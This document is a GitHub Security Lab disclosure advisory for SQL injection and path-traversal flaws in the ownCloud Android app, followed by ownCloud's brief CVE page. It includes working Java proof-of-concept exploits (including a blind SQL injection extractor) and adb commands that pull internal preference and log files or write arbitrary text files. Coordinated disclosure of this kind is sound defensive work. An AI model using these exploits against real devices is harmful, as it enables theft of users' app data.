=== Content from securitylab.github.com_ad074dd9_20250114_185710.html ===

[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

February 7, 2023
# GHSL-2022-059\_GHSL-2022-060: SQL injection vulnerabilities in Owncloud Android app - CVE-2023-24804, CVE-2023-23948

[![Author avatar](https://avatars.githubusercontent.com/u/61799930)
Tony Torralba](https://github.com/ghsecuritylab)

## Coordinated Disclosure Timeline

* 2022-07-26: Issues notified to ownCloud through HackerOne.
* 2022-08-01: Report receipt acknowledged.
* 2022-09-07: We request a status update for GHSL-2022-059.
* 2022-09-08: ownCloud says that they are still working on the fix for GHSL-2022-059.
* 2022-10-26: We request a status update for GHSL-2022-060.
* 2022-10-27: ownCloud says that they are still working on the fix for GHSL-2022-060.
* 2022-11-28: We request another status update for GHSL-2022-059.
* 2022-11-28: ownCloud says that the fix for GHSL-2022-059 will be published in the next release.
* 2022-12-12: Version 3.0 is published.
* 2022-12-20: We verify that version 3.0 fixed GHSL-2022-060.
* 2022-12-20: We verify that the fix for GHSL-2022-059 was not included in the release. We ask ownCloud about it.
* 2023-01-31: ownCloud informs us that in 3.0 the filelist database was deprecated (empty, only used for migrations from older versions) and planned to be removed in a future version.
* 2023-01-31: We answer that, while that would mitigate one of the reported injections, the other one affects the `owncloud_database` database, which remains relevant.
* 2023-02-2: Publishing advisories as per our [disclosure policy](https://securitylab.github.com/advisories/#policy).

## Summary

The Owncloud Android app uses [content providers](https://developer.android.com/guide/topics/providers/content-provider-basics) to manage its data. The provider `FileContentProvider` has SQL injection vulnerabilities that allow malicious applications or users in the same device to obtain internal information of the app.

The app also handles externally-provided files in the activity `ReceiveExternalFilesActivity`, where potentially malicious file paths are not properly sanitized, allowing attackers to read from and write to the application’s internal storage.

## Product

Owncloud Android app

## Tested Version

[v2.21.1](https://github.com/owncloud/android/releases/tag/oc-android-2.21.1)

## Details

### Issue 1: SQL injection in `FileContentProvider.kt` (`GHSL-2022-059`)

The `FileContentProvider` provider is exported, as can be seen in the Android Manifest:

[`AndroidManifest.xml:153`](https://github.com/owncloud/android/blob/73f152c242dd818b9c4de267fe072338a35ff2ba/owncloudApp/src/main/AndroidManifest.xml#L153)

```
<provider
    android:name=".providers.FileContentProvider"
    android:authorities="@string/authority"
    android:enabled="true"
    android:exported="true"
    android:label="@string/sync_string_files"
    android:syncable="true" />

```

All tables in this content provider can be freely interacted with by other apps in the same device. By reviewing the entry-points of the content provider for those tables, it can be seen that several user-controller parameters end up reaching an unsafe SQL method that allows for SQL injection.

#### The `delete` method

User input enters the content provider through the three parameters of this method:

[`FileContentProvider.kt:85`](https://github.com/owncloud/android/blob/73f152c242dd818b9c4de267fe072338a35ff2ba/owncloudApp/src/main/java/com/owncloud/android/providers/FileContentProvider.kt#L85)

```
override fun delete(uri: Uri, where: String?, whereArgs: Array<String>?): Int {

```

The `where` parameter reaches the following dangerous arguments without sanitization:

[`FileContentProvider.kt:102`](https://github.com/owncloud/android/blob/73f152c242dd818b9c4de267fe072338a35ff2ba/owncloudApp/src/main/java/com/owncloud/android/providers/FileContentProvider.kt#L102)

```
private fun delete(db: SQLiteDatabase, uri: Uri, where: String?, whereArgs: Array<String>?): Int {
    // --snip--
    when (uriMatcher.match(uri)) {
        SINGLE_FILE -> {
            // --snip--
            count = db.delete(
                ProviderTableMeta.FILE_TABLE_NAME,
                ProviderTableMeta._ID +
                        "=" +
                        uri.pathSegments[1] +
                        if (!TextUtils.isEmpty(where))
                            " AND ($where)" // injection
                        else
                            "", whereArgs
            )
        }
        DIRECTORY -> {
            // --snip--
            count += db.delete(
                ProviderTableMeta.FILE_TABLE_NAME,
                ProviderTableMeta._ID + "=" +
                        uri.pathSegments[1] +
                        if (!TextUtils.isEmpty(where))
                            " AND ($where)" // injection
                        else
                            "", whereArgs
            )
        }
        ROOT_DIRECTORY ->
            count = db.delete(ProviderTableMeta.FILE_TABLE_NAME, where, whereArgs) // injection
        SHARES -> count =
            OwncloudDatabase.getDatabase(MainApp.appContext).shareDao().deleteShare(uri.pathSegments[1])
        CAPABILITIES -> count = db.delete(ProviderTableMeta.CAPABILITIES_TABLE_NAME, where, whereArgs) // injection
        UPLOADS -> count = db.delete(ProviderTableMeta.UPLOADS_TABLE_NAME, where, whereArgs) // injection
        CAMERA_UPLOADS_SYNC -> count = db.delete(ProviderTableMeta.CAMERA_UPLOADS_SYNC_TABLE_NAME, where, whereArgs) // injection
        QUOTAS -> count = db.delete(ProviderTableMeta.USER_QUOTAS_TABLE_NAME, where, whereArgs) // injection
        // --snip--
    }
    // --snip--
}

```
#### The `insert` method

User input enters the content provider through the two parameters of this method:

[`FileContentProvider.kt:183`](https://github.com/owncloud/android/blob/73f152c242dd818b9c4de267fe072338a35ff2ba/owncloudApp/src/main/java/com/owncloud/android/providers/FileContentProvider.kt#L183)

```
override fun insert(uri: Uri, values: ContentValues?): Uri? {

```

The `values` parameter reaches the following dangerous arguments without sanitization:

[`FileContentProvider.kt:197`](https://github.com/owncloud/android/blob/73f152c242dd818b9c4de267fe072338a35ff2ba/owncloudApp/src/main/java/com/owncloud/android/providers/FileContentProvider.kt#L197)

```
 private fun insert(db: SQLiteDatabase, uri: Uri, values: ContentValues?): Uri {
    when (uriMatcher.match(uri)) {
        ROOT_DIRECTORY, SINGLE_FILE -> {
            // --snip--
            return if (!doubleCheck.moveToFirst()) {
                // --snip--
                val fileId = db.insert(ProviderTableMeta.FILE_TABLE_NAME, null, values) // injection
                // --snip--
            }
            // --snip--
        }
        // --snip--

        CAPABILITIES -> {
            val capabilityId = db.insert(ProviderTableMeta.CAPABILITIES_TABLE_NAME, null, values) // injection
            // --snip--
        }

        UPLOADS -> {
            val uploadId = db.insert(ProviderTableMeta.UPLOADS_TABLE_NAME, null, values) // injection
            // --snip--
        }

        CAMERA_UPLOADS_SYNC -> {
            val cameraUploadId = db.insert(
                ProviderTableMeta.CAMERA_UPLOADS_SYNC_TABLE_NAME, null,
                values // injection
            )
            // --snip--
        }
        QUOTAS -> {
            val quotaId = db.insert(
                ProviderTableMeta.USER_QUOTAS_TABLE_NAME, null,
                values // injection
            )
            // --snip--
        }
        // --snip--
    }
}

```
#### The `query` method

User input enters the content provider through the five parameters of this method:

[`FileContentProvider.kt:304`](https://github.com/owncloud/android/blob/73f152c242dd818b9c4de267fe072338a35ff2ba/owncloudApp/src/main/java/com/owncloud/android/providers/FileContentProvider.kt#L304-L309)

```
override fun query(
    uri: Uri,
    projection: Array<String>?,
    selection: String?,
    selectionArgs: Array<String>?,
    sortOrder: String?
): Cursor {

```

The `selection` and `sortOrder` parameters reach the following dangerous arguments without sanitization (note that `projection` is safe because of the use of a projection map):

[`FileContentProvider.kt:337`](https://github.com/owncloud/android/blob/73f152c242dd818b9c4de267fe072338a35ff2ba/owncloudApp/src/main/java/com/owncloud/android/providers/FileContentProvider.kt#L337-L354)

```
SHARES -> {
    val supportSqlQuery = SupportSQLiteQueryBuilder
        .builder(ProviderTableMeta.OCSHARES_TABLE_NAME)
        .columns(computeProjection(projection))
        .selection(selection, selectionArgs) // injection
        .orderBy(
            if (TextUtils.isEmpty(sortOrder)) {
                sortOrder // injection
            } else {
                ProviderTableMeta.OCSHARES_DEFAULT_SORT_ORDER
            }
        ).create()

    // To use full SQL queries within Room
    val newDb: SupportSQLiteDatabase =
        OwncloudDatabase.getDatabase(MainApp.appContext).openHelper.writableDatabase
    return newDb.query(supportSqlQuery)
}

```

[`FileContentProvider.kt:402`](https://github.com/owncloud/android/blob/73f152c242dd818b9c4de267fe072338a35ff2ba/owncloudApp/src/main/java/com/owncloud/android/providers/FileContentProvider.kt#L402)

```
val c = sqlQuery.query(db, projection, selection, selectionArgs, null, null, order)

```
#### The `update` method

User input enters the content provider through the four parameters of this method:

[`FileContentProvider.kt:458`](https://github.com/owncloud/android/blob/73f152c242dd818b9c4de267fe072338a35ff2ba/owncloudApp/src/main/java/com/owncloud/android/providers/FileContentProvider.kt#L444)

```
override fun update(uri: Uri, values: ContentValues?, selection: String?, selectionArgs: Array<String>?): Int {

```

The `values` and `selection` parameters reach the following dangerous arguments without sanitization:

[`FileContentProvider.kt:458`](https://github.com/owncloud/android/blob/73f152c242dd818b9c4de267fe072338a35ff2ba/owncloudApp/src/main/java/com/owncloud/android/providers/FileContentProvider.kt#L458-L486)

```
private fun update(
        db: SQLiteDatabase,
        uri: Uri,
        values: ContentValues?,
        selection: String?,
        selectionArgs: Array<String>?
): Int {
    if (selection != null && selectionArgs == null) {
        throw IllegalArgumentException("Selection not allowed, use parameterized queries")
    }
    when (uriMatcher.match(uri)) {
        DIRECTORY -> return 0 //updateFolderSize(db, selectionArgs[0]);
        SHARES -> return values?.let {
            OwncloudDatabase.getDatabase(context!!).shareDao()
                .update(OCShareEntity.fromContentValues(it)).toInt()
        } ?: 0
        CAPABILITIES -> return db.update(ProviderTableMeta.CAPABILITIES_TABLE_NAME, values, selection, selectionArgs) // injection
        UPLOADS -> {
            val ret = db.update(ProviderTableMeta.UPLOADS_TABLE_NAME, values, selection, selectionArgs) // injection
            trimSuccessfulUploads(db)
            return ret
        }
        CAMERA_UPLOADS_SYNC -> return db.update(ProviderTableMeta.CAMERA_UPLOADS_SYNC_TABLE_NAME, values, selection, selectionArgs) // injection
        QUOTAS -> return db.update(ProviderTableMeta.USER_QUOTAS_TABLE_NAME, values, selection, selectionArgs) // injection
        else -> return db.update(
            ProviderTableMeta.FILE_TABLE_NAME, values, selection, selectionArgs // injection
        )
    }
}

```
#### Impact

There are two databases affected by this vulnerability: `filelist` and `owncloud_database`.

Since the tables in `filelist` are affected by the injections in the `insert` and `update` methods, an attacker can use those to insert a crafted row in any table of the database containing data queried from other tables. After that, the attacker only needs to query the crafted row to obtain the information (see the `Resources` section for a PoC). Despite that, currently all tables are legitimately exposed through the content provider itself, so the injections cannot be exploited to obtain any extra data. Nonetheless, if new tables were added in the future that were not accessible through the content provider, those could be accessed using these vulnerabilities.

Regarding the tables in `owncloud_database`, there are two that are not accessible through the content provider: `room_master_table` and `folder_backup`. An attacker can exploit the vulnerability in the `query` method to exfiltrate data from those. Since the `strictMode` is enabled in the `query` method, the attacker needs to use a Blind SQL injection attack to succeed (see the `Resources` section for a PoC).

In both cases, the impact is information disclosure. Take into account that the tables exposed in the content provider (most of them) are arbitrarily modifiable by third party apps already, since the `FileContentProvider` is exported and does not require any permissions.

#### Resources

##### SQL injection in `filelist`

The following PoC demonstrates how a malicious application with no special permissions could extract information from any table in the `filelist` database exploiting the issues mentioned above:

```
package com.example.test;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

public class OwncloudProviderExploit {

    public static String exploit(Context ctx, String columnName, String tableName) throws Exception {
        Uri result = ctx.getContentResolver().insert(Uri.parse("content://org.owncloud/file"), newOwncloudFile());
        ContentValues updateValues = new ContentValues();
        updateValues.put("etag=?,path=(SELECT GROUP_CONCAT(" + columnName + ",'\n') " +
                "FROM " + tableName + ") " +
                "WHERE _id=" + result.getLastPathSegment() + "-- -", "a");
        Log.e("test", "" + ctx.getContentResolver().update(
                result, updateValues, null, null));
        String query = query(ctx, new String[]{"path"},
                "_id=?", new String[]{result.getLastPathSegment()});
        deleteFile(ctx, result.getLastPathSegment());
        return query;
    }

    public static String query(Context ctx, String[] projection, String selection, String[] selectionArgs) throws Exception {
        try (Cursor mCursor = ctx.getContentResolver().query(Uri.parse("content://org.owncloud/file"),
                projection,
                selection,
                selectionArgs,
                null)) {
            if (mCursor == null) {
                Log.e("evil", "mCursor is null");
                return "0";
            }
            StringBuilder output = new StringBuilder();
            while (mCursor.moveToNext()) {
                for (int i = 0; i < mCursor.getColumnCount(); i++) {
                    String column = mCursor.getColumnName(i);
                    String value = mCursor.getString(i);
                    output.append("|").append(column).append(":").append(value);
                }
                output.append("\n");
            }
            return output.toString();
        }
    }

    private static ContentValues newOwncloudFile() throws Exception {
        ContentValues values = new ContentValues();
        values.put("parent", "a");
        values.put("filename", "a");
        values.put("created", "a");
        values.put("modified", "a");
        values.put("modified_at_last_sync_for_data", "a");
        values.put("content_length", "a");
        values.put("content_type", "a");
        values.put("media_path", "a");
        values.put("path", "a");
        values.put("file_owner", "a");
        values.put("last_sync_date", "a");
        values.put("last_sync_date_for_data", "a");
        values.put("etag", "a");
        values.put("share_by_link", "a");
        values.put("shared_via_users", "a");
        values.put("permissions", "a");
        values.put("remote_id", "a");
        values.put("update_thumbnail", "a");
        values.put("is_downloading", "a");
        values.put("etag_in_conflict", "a");
        return values;
    }

    public static String deleteFile(Context ctx, String id) throws Exception {
        ctx.getContentResolver().delete(
                Uri.parse("content://org.owncloud/file/" + id),
                null,
                null
        );
        return "1";
    }
}

```

By providing a columnName and tableName to the exploit function, the attacker takes advantage of the issues explained above to:

* Create a new file entry in `FileContentProvider`.
* Exploit the SQL Injection in the `update` method to set the `path` of the recently created file to the values of `columnName` in the table `tableName`.
* Query the `path` of the modified file entry to obtain the desired values.
* Delete the file entry.

For instance, `exploit(context, "name", "SQLITE_MASTER WHERE type="table")` would return all the tables in the `filelist` database.

##### Blind SQL injection in `owncloud_database`

The following PoC demonstrates how a malicious application with no special permissions could extract information from any table in the `owncloud_database` database exploiting the issues mentioned above using a Blind SQL injection technique:

```
package com.example.test;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

public class OwncloudProviderExploit {

    public static String blindExploit(Context ctx) {
        String output = "";
        String chars = "abcdefghijklmopqrstuvwxyz0123456789";
        while (true) {
            int outputLength = output.length();
            for (int i = 0; i < chars.length(); i++) {
                char candidate = chars.charAt(i);
                String attempt = String.format("%s%c%s", output, candidate, "%");
                try (Cursor mCursor = ctx.getContentResolver().query(
                        Uri.parse("content://org.owncloud/shares"),
                        null,
                        "'a'=? AND (SELECT identity_hash FROM room_master_table) LIKE '" + attempt + "'",
                        new String[]{"a"}, null)) {
                    if (mCursor == null) {
                        Log.e("ProviderHelper", "mCursor is null");
                        return "0";
                    }
                    if (mCursor.getCount() > 0) {
                        output += candidate;
                        Log.i("evil", output);
                        break;
                    }
                }
            }
            if (output.length() == outputLength)
                break;
        }
        return output;
    }

}

```
### Issue 2: Insufficient path validation in `ReceiveExternalFilesActivity.java` (`GHSL-2022-060`)

#### Access to arbitrary files in the app’s internal storage fix bypass

`ReceiveExternalFilesActivity` handles the upload of files provided by third party components in the device. The received data can be set arbitrarily by attackers, causing some functions that handle file paths to have unexpected behavior. https://hackerone.com/reports/377107 shows how that could be exploited in the past, using the `"android.intent.extra.STREAM` extra to force the application to upload its internal files, like `com.owncloud.android_preferences.xml`. To fix it, the following code was added:

[`ReceiveExternalFilesActivity.java:521`](https://github.com/owncloud/android/blob/73f152c242dd818b9c4de267fe072338a35ff2ba/owncloudApp/src/main/java/com/owncloud/android/ui/activity/ReceiveExternalFilesActivity.java#L521)

```
private void prepareStreamsToUpload() {
    // --snip--

    for (Uri stream : mStreamsToUpload) {
        String streamToUpload = stream.toString();
        if (streamToUpload.contains("/data") &&
                streamToUpload.contains(getPackageName()) &&
                !streamToUpload.contains(getCacheDir().getPath())
        ) {
            finish();
        }
    }
}

```

This protection can be bypassed in two ways:

* Using the path returned by `getCacheDir()` in the payload, e.g. `"file:///data/user/0/com.owncloud.android/cache/../shared_prefs/com.owncloud.android_preferences.xml"`.
* Using a content provider URI that uses the `org.owncloud.files` provider to access the app’s internal `file` folder, e.g. `"content://org.owncloud.files/files/owncloud/logs/owncloud.2022-07-25.log"`.

With those payloads, the original issue can be still exploited with the same impact.

#### Write of arbitrary `.txt` files in the app’s internal storage

Additionally, there’s another insufficient path validation when uploading a plain text file that allows to write arbitrary files in the app’s internal storage.

When uploading a plain text file, the following code is executed, using the user-provided text at `input` to save the file:

`ReceiveExternalFilesActivity:920`

```
private void showUploadTextDialog() {
        // --snip--
        final TextInputEditText input = dialogView.findViewById(R.id.inputFileName);
        // --snip--
        setFileNameFromIntent(alertDialog, input);
        alertDialog.setOnShowListener(dialog -> {
            Button button = alertDialog.getButton(AlertDialog.BUTTON_POSITIVE);
            button.setOnClickListener(view -> {
                // --snip--
                } else {
                    fileName += ".txt";
                    Uri fileUri = savePlainTextToFile(fileName);
                    mStreamsToUpload.clear();
                    mStreamsToUpload.add(fileUri);
                    uploadFiles();
                }
                inputLayout.setErrorEnabled(error != null);
                inputLayout.setError(error);
            });
        });
        alertDialog.show();
    }

```

By reviewing `savePlainTextToFile`, it can be seen that the plain text file is momentarily saved in the app’s cache, but the destination path is built using the user-provided `fileName`:

`ReceiveExternalFilesActivity:983`

```
private Uri savePlainTextToFile(String fileName) {
    Uri uri = null;
    String content = getIntent().getStringExtra(Intent.EXTRA_TEXT);
    try {
        File tmpFile = new File(getCacheDir(), fileName); // here
        FileOutputStream outputStream = new FileOutputStream(tmpFile);
        outputStream.write(content.getBytes());
        outputStream.close();
        uri = Uri.fromFile(tmpFile);

    } catch (IOException e) {
        Timber.w(e, "Failed to create temp file for uploading plain text: %s", e.getMessage());
    }
    return uri;
}

```

An attacker can exploit this using a path traversal attack to write arbitrary text files into the app’s internal storage or other restricted directories accessible by it. The only restriction is that the file will always have the `.txt` extension, limiting the impact.

#### Impact

These issues may lead to information disclosure when uploading the app’s internal files, and to arbitrary file write when uploading plain text files (although limited by the `.txt` extension).

#### Resources

The following PoC demonstrates how to upload arbitrary files from the app’s internal storage:

```
adb shell am start -n com.owncloud.android.debug/com.owncloud.android.ui.activity.ReceiveExternalFilesActivity -t "text/plain" -a "android.intent.action.SEND" --eu "android.intent.extra.STREAM" "file:///data/user/0/com.owncloud.android.debug/cache/../shared_prefs/com.owncloud.android.debug_preferences.xml"

```

The following PoC demonstrates how to upload arbitrary files from the app’s internal `files` directory:

```
adb shell am start -n com.owncloud.android.debug/com.owncloud.android.ui.activity.ReceiveExternalFilesActivity -t "text/plain" -a "android.intent.action.SEND" --eu "android.intent.extra.STREAM" "content://org.owncloud.files/files/owncloud/logs/owncloud.2022-07-25.log"

```

The following PoC demonstrates how to write an arbitrary `test.txt` text file to the app’s internal storage:

```
adb shell am start -n com.owncloud.android.debug/com.owncloud.android.ui.activity.ReceiveExternalFilesActivity -t "text/plain" -a "android.intent.action.SEND" --es "android.intent.extra.TEXT" "Arbitrary contents here" --es "android.intent.extra.TITLE" "../shared_prefs/test"

```
## Credit

These issues were discovered and reported by the CodeQL team member [@atorralba (Tony Torralba)](https://github.com/atorralba).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2022-059` or `GHSL-2022-060` in any communication regarding these issues.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information



=== Content from owncloud.com_4fd6c539_20250114_185709.html ===


[![Open-source secure file sync, share and content collaboration with ownCloud](https://owncloud.com/wp-content/themes/ownCloud/dist/assets/img/oc-logo-kiteworks-large.svg "Open-source secure file sync, share and content collaboration with ownCloud")](https://owncloud.com "ownCloud")
[![Open-source secure file sync, share and content collaboration with ownCloud](https://owncloud.com/wp-content/themes/ownCloud/dist/assets/img/oc-logo-kiteworks-large.svg "Open-source secure file sync, share and content collaboration with ownCloud")](https://owncloud.com "ownCloud")

* [Products](https://owncloud.com/product/)

  #### products

  + Products
    - [Infinite Scale](https://owncloud.com/infinite-scale-2/)
    - [ownCloud 10](/product)
    - [ownCloud online](https://owncloud.online)
    - [Pricing](https://owncloud.com/pricing/)
  + Integrations
    - [Microsoft Office Online Server](https://owncloud.com/owncloud-and-microsoft/)
    - [Microsoft 365](https://owncloud.com/features/microsoft-365-integration/)
    - [Microsoft Teams](https://owncloud.com/features/microsoft-teams-integration/)
    - [Microsoft Outlook](https://owncloud.com/features/outlook-plugin/)
    - [Microsoft WND](https://owncloud.com/features/windows-network-drive-integration/)
  + Integrations
    - [Collabora Online](https://owncloud.com/collabora/)
    - [ONLYOFFICE](https://owncloud.com/onlyoffice/)
* Solutions

  #### solutions

  + Industries
    - [For Public Sector](https://owncloud.com/industry-solutions/cloud-storage-for-public-sector/)
    - [For Manufacturing](https://owncloud.com/industry-solutions/cloud-security-engineering-and-manufacturing/)
    - [For Automotive](https://owncloud.com/industry-solutions/automotive-cloud/)
    - [For Legal & Law](https://owncloud.com/industry-solutions/secure-file-share-legal-companies/)
    - [For HealthCare & Life Sciences](https://owncloud.com/industry-solutions/digitalization-in-healthcare/)
    - [For Education](https://owncloud.com/industry-solutions/cloud-for-educational-institutions/)
    - [For Chemicals and Pharma](https://owncloud.com/industry-solutions/content-collaboration-chemicals/)
    - [For Defense and Space](https://owncloud.com/industry-solutions/share-files-defense-and-space/)
  + Use Cases
    - [Digital Workspace](https://owncloud.com/modular-collaboration-stack/)
    - [Secure Content Collaboration](https://owncloud.com/digital-collaboration/)
    - [Secure Fileshare & Sync](https://owncloud.com/secure-file-sharing-and-storage/)
    - [GDPR compliance](https://owncloud.com/gdpr/)
    - [FTP / Network drive](https://owncloud.com/secure-ftp-alternative/)
* Community

  #### community

  + [The ownCloud DNA](https://owncloud.com/about-us/)
  + [Contribute to our Project](https://owncloud.com/contribute/)
  + [Beta & testing](https://owncloud.com/beta-testing/)
  + [Forum](https://central.owncloud.org/)
* Resources

  #### resources

  + [Docs & Guides](https://owncloud.com/docs-guides/)
  + [Documentation](https://doc.owncloud.com/docs/next/)
  + [Training](https://owncloud.com/administrators-training/)
  + [Download Server](https://owncloud.com/download-server/)
  + [Download Desktop App](https://owncloud.com/desktop-app/)
  + [Download Mobile Apps](https://owncloud.com/mobile-apps/)
  + [Marketplace](https://marketplace.owncloud.com/)
* [Partners](https://owncloud.com/partners/)

  #### partners

  + [Find a Partner](https://owncloud.com/partners/find-a-partner/)
  + [Become a Partner](https://owncloud.com/partners/apply-for-partner-program/)
  + [Partner Portal](https://portal.owncloud.com/login)
  + [Partner Community](https://owncloud.com/partners/)
* [About Us](https://owncloud.com/about-us/)

  #### about us

  + [News](https://owncloud.com/news/)
  + [Press](https://owncloud.com/press/)
  + [Events](https://owncloud.com/events/)
  + [Company](https://owncloud.com/about-us/)
  + [Career](https://owncloud.com/career/)
  + [Why ownCloud](https://owncloud.com/why-owncloud/)
  + [Customers](https://owncloud.com/customers/)

[Get started](https://owncloud.com/get-started/ "Get starte with ownCloud")

[Contact](https://owncloud.com/contact-us/ "Get in touch with ownCloud")

[ownCloud on GitHub](https://github.com/owncloud "ownCloud on GitHub")

[Blog](/news "Blog")

[Search](https://owncloud.com/search/ "Search ownCloud")
Search for:

 Close

# Insufficient path validation in Android App

Feb 13, 2023

* Risk: low
* CVSS v3 Base Score: 5
* CVSS v3 Vector: AV:L/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
* CWE ID: CWE-35
* CWE Name: Path Traversal: ‘…/…//’
* CVE: CVE-2023-24804

### Description

Due to missing file path sanitation an attacker could read from and write to the Android app’s internal storage.

### Affected

* ownCloud app for Android < 3.0

### Action taken

Added a proper sanitation and validation of the file path.

### Acknowledgment

This issue was discovered and reported by the CodeQL team member @atorralba (Tony Torralba).

[Go to security overview](https://owncloud.com/security/)

[![ownCloud secure cloud solution for file sharing](https://owncloud.com/wp-content/uploads/2024/02/oc-logo-kiteworks-large.svg "oc-logo-kiteworks-large")](https://owncloud.com/)

#### Get started

* [Download server](https://owncloud.com/download-server/)
* [Download desktop app](https://owncloud.com/desktop-app/)
* [Get mobile apps](https://owncloud.com/mobile-apps/)
* [ownCloud.online](https://owncloud.online/)
* [Start Enterprise trial](https://owncloud.com/?page_id=54624)
* [Self-service demo](https://owncloud.com/?page_id=56887)

#### Product

* [Overview](https://owncloud.com/product/)
* [Why ownCloud](https://owncloud.com/why-owncloud/)
* [Features](https://owncloud.com/features/)
* [Pricing](https://owncloud.com/pricing/)
* [Compare editions](https://owncloud.com/find-the-right-edition/)
* [Compare solutions](https://owncloud.com/compare-filesharing/)
* [Industry solutions](https://owncloud.com/industry-solutions/)
* [Changelog](https://owncloud.com/changelog/)
* [Security](https://owncloud.com/security/)
* [Get a quote](https://owncloud.com/get-quote/)

#### Company

* [About us](https://owncloud.com/about-us/)
* [Events](https://owncloud.com/events/)
* [Our customers](https://owncloud.com/customers/)
* [Partners](https://owncloud.com/partners/)
* [Career](https://owncloud.com/career/)
* [Press](https://owncloud.com/press/)
* [News](https://owncloud.com/news/)
* [Contact us](https://owncloud.com/contact-us/)
* [Recognition & awards](https://owncloud.com/recognition-and-awards/)
* [Sustainability](https://owncloud.com/sustainability/)

#### Community

* [Contribute](https://owncloud.com/contribute/)
* [Source Code](https://github.com/owncloud)
* [Beta & testing](https://owncloud.com/beta-testing/)
* [Forum](https://central.owncloud.org/)
* [Marketplace](https://marketplace.owncloud.com/)
* [Chatroom](https://talk.owncloud.com/)

#### Help

* [Docs & guides](https://owncloud.com/docs-guides/)
* [Service packages](https://owncloud.com/service-packages/)
* [Customer support](https://owncloud.com/support/)
* [FAQs](https://owncloud.com/faq/)
* [Portal](https://portal.owncloud.com/)
* [Training](https://owncloud.com/administrators-training/)
* [Request a demo](https://owncloud.com/schedule-demo/)

#### Legal

* [Trademark](https://owncloud.com/trademark/)
* [Privacy](https://owncloud.com/privacy-statement/)
* [Imprint](https://owncloud.com/imprint/)

#### **Follow Us**

U

[Search](/search "Search")

î£

Copyright Â© 2025 ownCloud GmbH


